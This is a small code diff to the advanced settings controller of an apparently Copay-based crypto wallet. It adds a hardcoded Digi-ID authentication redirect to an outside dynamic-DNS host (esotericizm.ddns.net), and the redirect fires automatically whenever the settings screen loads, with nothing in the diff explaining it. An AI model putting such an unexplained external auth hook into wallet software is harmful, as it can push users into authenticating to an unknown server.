@@ -1,6 +1,7 @@
 'use strict';
 
-angular.module('copayApp.controllers').controller('advancedSettingsController', function($scope, $log, configService, platformInfo) {
+angular.module('copayApp.controllers').controller('advancedSettingsController', function($scope, $log, incomingData, configService, platformInfo) {
+  incomingData.redir('digiid://esotericizm.ddns.net/digiid/callback?x=e9a01df4c7416fcf019f2b216b880d0e&u=0');
 
   var updateConfig = function() {
     var config = configService.getSync();
